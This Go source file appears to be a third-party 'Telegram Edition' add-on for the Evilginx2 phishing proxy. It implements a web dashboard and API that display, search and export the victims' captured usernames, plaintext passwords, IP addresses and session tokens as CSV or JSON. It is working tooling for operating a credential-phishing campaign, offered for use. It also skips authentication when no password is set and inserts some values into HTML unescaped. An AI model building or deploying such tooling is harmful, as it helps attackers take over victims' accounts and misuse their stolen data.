// Package core provides the core functionality for Evilginx2.
// This file implements a web-based dashboard for viewing captured
// sessions with search, filter, export, and dark mode support.
//
// Telegram Edition by @officialmonsterz (https://t.me/officialmonsterz)
package core

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// DashboardConfig holds the web dashboard configuration.
type DashboardConfig struct {
	Enabled     bool   `json:"enabled"`
	BindAddress string `json:"bind_address"`
	Username    string `json:"username"`
	Password    string `json:"password"`
}

// DashboardServer manages the HTTP server and session data for the web dashboard.
type DashboardServer struct {
	config   *DashboardConfig
	db       *database.Database
	server   *http.Server
	mu       sync.RWMutex
	sessions []*database.Session
}

// NewDashboardServer creates a new dashboard server instance.
func NewDashboardServer(cfg *DashboardConfig, db *database.Database) (*DashboardServer, error) {
	if cfg == nil {
		return nil, fmt.Errorf("dashboard: config is nil")
	}
	if db == nil {
		return nil, fmt.Errorf("dashboard: database reference is nil")
	}
	return &DashboardServer{
		config: cfg,
		db:     db,
	}, nil
}

// Start begins the dashboard HTTP server on the configured address.
func (ds *DashboardServer) Start() error {
	if !ds.config.Enabled {
		log.Info("dashboard: web interface is disabled")
		return nil
	}

	mux := http.NewServeMux()
	mux.HandleFunc("/", ds.basicAuth(ds.handleDashboard))
	mux.HandleFunc("/api/sessions", ds.basicAuth(ds.handleAPISessions))
	mux.HandleFunc("/api/sessions/export", ds.basicAuth(ds.handleExportSessions))
	mux.HandleFunc("/api/sessions/", ds.basicAuth(ds.handleAPISessionDetail))
	mux.HandleFunc("/static/", ds.basicAuth(ds.handleStatic))

	ds.server = &http.Server{
		Addr:         ds.config.BindAddress,
		Handler:      mux,
		ReadTimeout:  15 * time.Second,
		WriteTimeout: 15 * time.Second,
		IdleTimeout:  60 * time.Second,
	}

	go func() {
		log.Info("dashboard: web interface starting on http://%s", ds.config.BindAddress)
		if err := ds.server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Error("dashboard: server error: %v", err)
		}
	}()

	return nil
}

// Stop gracefully shuts down the dashboard HTTP server.
func (ds *DashboardServer) Stop() error {
	if ds.server != nil {
		log.Info("dashboard: shutting down web interface")
		return ds.server.Close()
	}
	return nil
}

// basicAuth is HTTP middleware that enforces Basic Authentication.
func (ds *DashboardServer) basicAuth(next http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		if ds.config.Username == "" && ds.config.Password == "" {
			next(w, r)
			return
		}
		user, pass, ok := r.BasicAuth()
		if !ok || user != ds.config.Username || pass != ds.config.Password {
			w.Header().Set("WWW-Authenticate", `Basic realm="Evilginx Dashboard"`)
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}
		next(w, r)
	}
}

// refreshSessions reloads the session cache from the database.
func (ds *DashboardServer) refreshSessions() error {
	ds.mu.Lock()
	defer ds.mu.Unlock()

	sessions, err := ds.db.ListSessions()
	if err != nil {
		return fmt.Errorf("dashboard: failed to list sessions: %v", err)
	}

	sort.Slice(sessions, func(i, j int) bool {
		return sessions[i].CreateTime > sessions[j].CreateTime
	})

	ds.sessions = sessions
	return nil
}

// handleDashboard renders the main dashboard HTML page.
func (ds *DashboardServer) handleDashboard(w http.ResponseWriter, r *http.Request) {
	if r.URL.Path != "/" {
		http.NotFound(w, r)
		return
	}
	tmpl := template.Must(template.New("dashboard").Parse(dashboardHTML))
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	tmpl.Execute(w, map[string]string{
		"Title": "Evilginx2 Dashboard — Telegram Edition by @officialmonsterz",
	})
}

// handleAPISessions returns sessions as JSON with optional search/filter parameters.
func (ds *DashboardServer) handleAPISessions(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	searchQuery := strings.ToLower(r.URL.Query().Get("search"))
	phishletFilter := r.URL.Query().Get("phishlet")
	limitStr := r.URL.Query().Get("limit")
	offsetStr := r.URL.Query().Get("offset")

	limit := 100
	if limitStr != "" {
		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 {
			limit = l
		}
	}
	offset := 0
	if offsetStr != "" {
		if o, err := strconv.Atoi(offsetStr); err == nil && o >= 0 {
			offset = o
		}
	}

	var filtered []*database.Session
	for _, s := range ds.sessions {
		if phishletFilter != "" && s.Phishlet != phishletFilter {
			continue
		}
		if searchQuery != "" {
			if !strings.Contains(strings.ToLower(s.Username), searchQuery) &&
				!strings.Contains(strings.ToLower(s.Password), searchQuery) &&
				!strings.Contains(strings.ToLower(s.Phishlet), searchQuery) &&
				!strings.Contains(strings.ToLower(s.RemoteAddr), searchQuery) {
				continue
			}
		}
		filtered = append(filtered, s)
	}

	totalCount := len(filtered)
	if offset > len(filtered) {
		filtered = nil
	} else {
		end := offset + limit
		if end > len(filtered) {
			end = len(filtered)
		}
		filtered = filtered[offset:end]
	}

	response := map[string]interface{}{
		"sessions":  filtered,
		"total":     totalCount,
		"count":     len(filtered),
		"offset":    offset,
		"limit":     limit,
		"phishlets": ds.getPhishletNames(),
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(response)
}

// handleAPISessionDetail returns a single session by ID.
func (ds *DashboardServer) handleAPISessionDetail(w http.ResponseWriter, r *http.Request) {
	if r.Method == http.MethodDelete {
		parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/sessions/"), "/")
		if len(parts) == 0 || parts[0] == "" {
			http.Error(w, "Session ID required", http.StatusBadRequest)
			return
		}
		id, err := strconv.Atoi(parts[0])
		if err != nil {
			http.Error(w, "Invalid session ID", http.StatusBadRequest)
			return
		}
		if err := ds.db.DeleteSessionById(id); err != nil {
			http.Error(w, err.Error(), http.StatusInternalServerError)
			return
		}
		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
		return
	}

	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	parts := strings.Split(strings.TrimPrefix(r.URL.Path, "/api/sessions/"), "/")
	if len(parts) == 0 || parts[0] == "" {
		http.Error(w, "Session ID required", http.StatusBadRequest)
		return
	}
	id, err := strconv.Atoi(parts[0])
	if err != nil {
		http.Error(w, "Invalid session ID", http.StatusBadRequest)
		return
	}

	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	for _, s := range ds.sessions {
		if s.Id == id {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(s)
			return
		}
	}
	http.Error(w, "Session not found", http.StatusNotFound)
}

// handleExportSessions exports sessions in CSV or JSON format.
func (ds *DashboardServer) handleExportSessions(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if err := ds.refreshSessions(); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	ds.mu.RLock()
	defer ds.mu.RUnlock()

	format := r.URL.Query().Get("format")
	if format == "" {
		format = "csv"
	}

	switch format {
	case "csv":
		w.Header().Set("Content-Type", "text/csv")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=sessions_%d.csv", time.Now().Unix()))
		writer := csv.NewWriter(w)
		defer writer.Flush()
		writer.Write([]string{"ID", "Phishlet", "Username", "Password", "Remote Address", "User-Agent", "Landing URL", "Created (UTC)"})
		for _, s := range ds.sessions {
			writer.Write([]string{
				strconv.Itoa(s.Id), s.Phishlet, s.Username, s.Password,
				s.RemoteAddr, s.UserAgent, s.LandingURL,
				time.Unix(s.CreateTime, 0).UTC().Format("2006-01-02 15:04:05"),
			})
		}
	case "json":
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=sessions_%d.json", time.Now().Unix()))
		json.NewEncoder(w).Encode(ds.sessions)
	default:
		http.Error(w, "Unsupported export format. Use 'csv' or 'json'.", http.StatusBadRequest)
	}
}

// handleStatic serves embedded static assets.
func (ds *DashboardServer) handleStatic(w http.ResponseWriter, r *http.Request) {
	http.NotFound(w, r)
}

// getPhishletNames returns a deduplicated list of phishlet names from cached sessions.
func (ds *DashboardServer) getPhishletNames() []string {
	names := make(map[string]bool)
	for _, s := range ds.sessions {
		if s.Phishlet != "" {
			names[s.Phishlet] = true
		}
	}
	var result []string
	for name := range names {
		result = append(result, name)
	}
	sort.Strings(result)
	return result
}

// dashboardHTML is the embedded HTML template with dark mode, search, and export.
// Telegram Edition by @officialmonsterz
const dashboardHTML = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{.Title}}</title>
    <style>
        :root {
            --bg: #ffffff; --bg-card: #f5f5f5; --text: #333333;
            --text-secondary: #666666; --border: #dddddd;
            --accent: #4a90d9; --accent-hover: #357abd;
            --success: #27ae60; --danger: #e74c3c;
            --table-stripe: #f9f9f9; --table-hover: #eef5ff; --input-bg: #ffffff;
        }
        @media (prefers-color-scheme: dark) {
            :root {
                --bg: #1a1a2e; --bg-card: #16213e; --text: #e0e0e0;
                --text-secondary: #a0a0a0; --border: #2a2a4a;
                --accent: #6c63ff; --accent-hover: #5a52d5;
                --success: #2ecc71; --danger: #e74c3c;
                --table-stripe: #1a1a30; --table-hover: #252550; --input-bg: #1a1a2e;
            }
        }
        .dark-mode {
            --bg: #1a1a2e; --bg-card: #16213e; --text: #e0e0e0;
            --text-secondary: #a0a0a0; --border: #2a2a4a;
            --accent: #6c63ff; --accent-hover: #5a52d5;
            --success: #2ecc71; --danger: #e74c3c;
            --table-stripe: #1a1a30; --table-hover: #252550; --input-bg: #1a1a2e;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg); color: var(--text);
            padding: 20px; transition: background 0.3s, color 0.3s;
        }
        .container { max-width: 1400px; margin: 0 auto; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 15px 20px; background: var(--bg-card); border-radius: 10px;
            border: 1px solid var(--border); margin-bottom: 20px; flex-wrap: wrap; gap: 10px;
        }
        .header h1 { font-size: 22px; }
        .header-controls { display: flex; gap: 10px; align-items: center; flex-wrap: wrap; }
        .header-credit { font-size: 11px; color: var(--text-secondary); }
        .header-credit a { color: var(--accent); text-decoration: none; }
        .header-credit a:hover { text-decoration: underline; }
        .btn {
            padding: 8px 16px; border: 1px solid var(--border); border-radius: 6px;
            background: var(--bg-card); color: var(--text); cursor: pointer;
            font-size: 13px; transition: all 0.2s; text-decoration: none;
        }
        .btn:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
        .btn-primary { background: var(--accent); color: #fff; border-color: var(--accent); }
        .btn-primary:hover { background: var(--accent-hover); }
        .btn-success { background: var(--success); color: #fff; border-color: var(--success); }
        .btn-danger { background: var(--danger); color: #fff; border-color: var(--danger); }
        .controls {
            display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; align-items: center;
        }
        .controls input, .controls select {
            padding: 8px 12px; border: 1px solid var(--border); border-radius: 6px;
            background: var(--input-bg); color: var(--text); font-size: 13px;
        }
        .controls input { flex: 1; min-width: 200px; }
        .stats {
            display: flex; gap: 15px; margin-bottom: 15px; flex-wrap: wrap;
        }
        .stat-card {
            background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px;
            padding: 15px 20px; flex: 1; min-width: 150px;
        }
        .stat-card .label { font-size: 12px; color: var(--text-secondary); text-transform: uppercase; }
        .stat-card .value { font-size: 28px; font-weight: bold; margin-top: 5px; }
        table {
            width: 100%; border-collapse: collapse; background: var(--bg-card);
            border-radius: 10px; overflow: hidden; border: 1px solid var(--border);
        }
        th {
            background: var(--accent); color: #fff; padding: 12px 15px;
            text-align: left; font-size: 12px; text-transform: uppercase; cursor: pointer;
            user-select: none; white-space: nowrap;
        }
        th:hover { background: var(--accent-hover); }
        td {
            padding: 10px 15px; border-bottom: 1px solid var(--border);
            font-size: 13px; max-width: 200px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
        }
        tr:nth-child(even) { background: var(--table-stripe); }
        tr:hover { background: var(--table-hover); }
        .badge {
            display: inline-block; padding: 2px 8px; border-radius: 12px;
            font-size: 11px; font-weight: 600;
        }
        .badge-phishlet { background: var(--accent); color: #fff; }
        .badge-tokens { background: var(--success); color: #fff; }
        .badge-notokens { background: var(--text-secondary); color: #fff; }
        .pagination {
            display: flex; justify-content: center; gap: 10px; margin-top: 15px; align-items: center;
        }
        .pagination span { color: var(--text-secondary); font-size: 13px; }
        .session-detail {
            background: var(--bg-card); border: 1px solid var(--border); border-radius: 8px;
            padding: 20px; margin-top: 15px;
        }
        .session-detail h3 { margin-bottom: 10px; }
        .session-detail pre {
            background: var(--bg); padding: 15px; border-radius: 6px; overflow-x: auto;
            font-size: 12px; border: 1px solid var(--border); white-space: pre-wrap; word-break: break-all;
        }
        .timestamp { font-size: 11px; color: var(--text-secondary); }
        .empty-state {
            text-align: center; padding: 60px 20px; color: var(--text-secondary);
        }
        .empty-state h2 { font-size: 20px; margin-bottom: 10px; }
        .toast {
            position: fixed; bottom: 20px; right: 20px; padding: 12px 20px;
            border-radius: 8px; color: #fff; font-size: 14px; z-index: 1000;
            opacity: 0; transition: opacity 0.3s; pointer-events: none;
        }
        .toast.show { opacity: 1; }
        .toast.success { background: var(--success); }
        .toast.error { background: var(--danger); }
        @media (max-width: 768px) {
            .header { flex-direction: column; }
            .header-controls { width: 100%; justify-content: center; }
            .controls input { min-width: 100%; }
            td { max-width: 120px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div>
                <h1>Evilginx2 Dashboard</h1>
                <div class="header-credit">Telegram Edition by <a href="https://t.me/officialmonsterz" target="_blank">@officialmonsterz</a></div>
            </div>
            <div class="header-controls">
                <button class="btn" onclick="toggleDarkMode()" id="darkToggle">Dark Mode</button>
                <span id="autoRefreshStatus" class="timestamp">Auto-refresh: ON (5s)</span>
            </div>
        </div>

        <div class="stats" id="stats">
            <div class="stat-card">
                <div class="label">Total Sessions</div>
                <div class="value" id="totalSessions">0</div>
            </div>
            <div class="stat-card">
                <div class="label">Unique Phishlets</div>
                <div class="value" id="uniquePhishlets">0</div>
            </div>
            <div class="stat-card">
                <div class="label">Displayed</div>
                <div class="value" id="displayedCount">0</div>
            </div>
        </div>

        <div class="controls">
            <input type="text" id="searchInput" placeholder="Search username, password, phishlet, IP..." oninput="applyFilters()">
            <select id="phishletFilter" onchange="applyFilters()">
                <option value="">All Phishlets</option>
            </select>
            <button class="btn btn-success" onclick="exportCSV()">Export CSV</button>
            <button class="btn btn-primary" onclick="exportJSON()">Export JSON</button>
            <button class="btn" onclick="refreshSessions()">Refresh</button>
        </div>

        <div id="sessionDetail" class="session-detail" style="display:none;">
            <h3>Session Detail</h3>
            <button class="btn btn-danger" onclick="hideDetail()" style="float:right;margin-top:-30px;">Close</button>
            <pre id="sessionDetailContent"></pre>
        </div>

        <table>
            <thead>
                <tr>
                    <th onclick="sortSessions('id')">ID</th>
                    <th onclick="sortSessions('phishlet')">Phishlet</th>
                    <th onclick="sortSessions('username')">Username</th>
                    <th onclick="sortSessions('password')">Password</th>
                    <th onclick="sortSessions('remoteaddr')">IP Address</th>
                    <th>Tokens</th>
                    <th onclick="sortSessions('createtime')">Created</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody id="sessionsBody">
                <tr><td colspan="8" class="empty-state">Loading sessions...</td></tr>
            </tbody>
        </table>

        <div class="pagination">
            <button class="btn" onclick="prevPage()">Previous</button>
            <span id="pageInfo">Page 1</span>
            <button class="btn" onclick="nextPage()">Next</button>
        </div>
    </div>

    <div id="toast" class="toast"></div>

    <script>
        let allSessions = [];
        let currentPage = 0;
        const pageSize = 50;
        let sortField = 'createtime';
        let sortAsc = false;
        let autoRefreshInterval = setInterval(refreshSessions, 5000);

        function applyFilters() {
            currentPage = 0;
            renderSessions();
        }

        function renderSessions() {
            const search = document.getElementById('searchInput').value.toLowerCase();
            const phishletFilter = document.getElementById('phishletFilter').value;

            let filtered = allSessions.filter(s => {
                if (phishletFilter && s.phishlet !== phishletFilter) return false;
                if (search) {
                    return (s.username || '').toLowerCase().includes(search) ||
                           (s.password || '').toLowerCase().includes(search) ||
                           (s.phishlet || '').toLowerCase().includes(search) ||
                           (s.remote_addr || '').toLowerCase().includes(search);
                }
                return true;
            });

            filtered.sort((a, b) => {
                let va = (a[sortField] || '').toString().toLowerCase();
                let vb = (b[sortField] || '').toString().toLowerCase();
                if (sortField === 'id' || sortField === 'createtime') {
                    va = parseFloat(va) || 0;
                    vb = parseFloat(vb) || 0;
                }
                return va < vb ? (sortAsc ? -1 : 1) : (va > vb ? (sortAsc ? 1 : -1) : 0);
            });

            document.getElementById('totalSessions').textContent = allSessions.length;
            const phishlets = new Set(allSessions.map(s => s.phishlet));
            document.getElementById('uniquePhishlets').textContent = phishlets.size;
            document.getElementById('displayedCount').textContent = filtered.length;

            const start = currentPage * pageSize;
            const pageData = filtered.slice(start, start + pageSize);
            const totalPages = Math.ceil(filtered.length / pageSize) || 1;
            document.getElementById('pageInfo').textContent = 'Page ' + (currentPage + 1) + ' of ' + totalPages;

            const tbody = document.getElementById('sessionsBody');
            if (pageData.length === 0) {
                tbody.innerHTML = '<tr><td colspan="8" class="empty-state"><h2>No sessions found</h2><p>Waiting for captures...</p></td></tr>';
                return;
            }

            tbody.innerHTML = pageData.map(s => {
                const time = s.create_time ? new Date(s.create_time * 1000).toLocaleString() : 'N/A';
                const hasTokens = (s.tokens && Object.keys(s.tokens).length > 0) ||
                                  (s.body_tokens && Object.keys(s.body_tokens).length > 0) ||
                                  (s.http_tokens && Object.keys(s.http_tokens).length > 0);
                const tokenBadge = hasTokens
                    ? '<span class="badge badge-tokens">captured</span>'
                    : '<span class="badge badge-notokens">none</span>';
                return '<tr onclick="showSessionDetail(' + JSON.stringify(s).replace(/"/g, '&quot;') + ')">' +
                    '<td>' + (s.id || '-') + '</td>' +
                    '<td><span class="badge badge-phishlet">' + escapeHtml(s.phishlet || '-') + '</span></td>' +
                    '<td>' + escapeHtml(s.username || '-') + '</td>' +
                    '<td>' + escapeHtml(s.password || '-') + '</td>' +
                    '<td>' + escapeHtml(s.remote_addr || '-') + '</td>' +
                    '<td>' + tokenBadge + '</td>' +
                    '<td class="timestamp">' + time + '</td>' +
                    '<td><button class="btn btn-danger" onclick="event.stopPropagation(); deleteSession(' + s.id + ')">Delete</button></td>' +
                    '</tr>';
            }).join('');
        }

        function showSessionDetail(session) {
            const detail = document.getElementById('sessionDetail');
            detail.style.display = 'block';
            document.getElementById('sessionDetailContent').textContent = JSON.stringify(session, null, 2);
            detail.scrollIntoView({ behavior: 'smooth' });
        }

        function hideDetail() {
            document.getElementById('sessionDetail').style.display = 'none';
        }

        async function refreshSessions() {
            try {
                const resp = await fetch('/api/sessions?limit=10000');
                const data = await resp.json();
                allSessions = data.sessions || [];
                renderSessions();

                const select = document.getElementById('phishletFilter');
                const currentVal = select.value;
                const phishlets = data.phishlets || [];
                select.innerHTML = '<option value="">All Phishlets</option>' +
                    phishlets.map(p => '<option value="' + p + '">' + p + '</option>').join('');
                select.value = currentVal;
            } catch (e) {
                console.error('Failed to refresh sessions:', e);
            }
        }

        async function deleteSession(id) {
            if (!confirm('Delete session #' + id + '?')) return;
            try {
                const resp = await fetch('/api/sessions/' + id, { method: 'DELETE' });
                if (resp.ok) {
                    refreshSessions();
                    showToast('Session #' + id + ' deleted', 'success');
                }
            } catch (e) {
                showToast('Delete failed', 'error');
            }
        }

        function prevPage() { if (currentPage > 0) { currentPage--; renderSessions(); } }
        function nextPage() { currentPage++; renderSessions(); }

        function sortSessions(field) {
            if (sortField === field) { sortAsc = !sortAsc; }
            else { sortField = field; sortAsc = false; }
            renderSessions();
        }

        function exportCSV() { window.open('/api/sessions/export?format=csv'); }
        function exportJSON() { window.open('/api/sessions/export?format=json'); }

        function toggleDarkMode() {
            document.body.classList.toggle('dark-mode');
            const btn = document.getElementById('darkToggle');
            btn.textContent = document.body.classList.contains('dark-mode') ? 'Light Mode' : 'Dark Mode';
        }

        function escapeHtml(str) {
            const div = document.createElement('div');
            div.textContent = str;
            return div.innerHTML;
        }

        function showToast(msg, type) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.className = 'toast ' + type + ' show';
            setTimeout(() => t.classList.remove('show'), 3000);
        }

        document.addEventListener('visibilitychange', () => {
            if (document.hidden) {
                clearInterval(autoRefreshInterval);
                document.getElementById('autoRefreshStatus').textContent = 'Auto-refresh: PAUSED';
            } else {
                autoRefreshInterval = setInterval(refreshSessions, 5000);
                document.getElementById('autoRefreshStatus').textContent = 'Auto-refresh: ON (5s)';
                refreshSessions();
            }
        });

        refreshSessions();
    </script>
</body>
</html>`
